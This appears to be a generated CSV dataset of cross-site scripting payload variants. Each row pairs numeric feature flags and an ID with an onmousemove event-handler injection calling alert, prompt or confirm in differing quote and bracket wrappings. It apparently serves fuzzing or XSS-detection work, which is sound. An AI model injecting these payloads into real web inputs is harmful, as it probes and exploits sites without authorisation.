5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,119,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,120,"["" onmousemove=alert``;""]"
5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,122,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,123,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,124,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,125,[ onmousemove=alert(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,126,[ onmousemove=prompt(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,127,[ onmousemove=confirm(); ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,0,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,1,1,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,1,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,1,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
5,3,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,128,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,0,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,1,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,1,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,129,[ onmousemove=alert(); ]
10,5,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,1,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,0,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,1,1,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,1,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,130,[ onmousemove=prompt(); ]
10,5,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,1,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,0,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,1,1,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,1,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,1,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,0,0,0,1,1,0,0,1,1,0,131,[ onmousemove=confirm(); ]
10,5,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,0,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,1,1,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,1,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,1,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,1,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
10,5,0,0,0,0,0,0,0,0,1,1,1,0,1,1,0,132,[ onmousemove=alert``; ]
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,133,"["" onmousemove=alert(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,134,"["" onmousemove=prompt(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,135,"["" onmousemove=confirm(); ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,1,1,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,136,"["" onmousemove=alert``; ]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,137,"["" onmousemove=alert();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,138,"["" onmousemove=prompt();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,1,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,1,1,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,139,"["" onmousemove=confirm();""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,1,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,1,1,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,1,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
5,3,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,140,"["" onmousemove=alert``;""]"
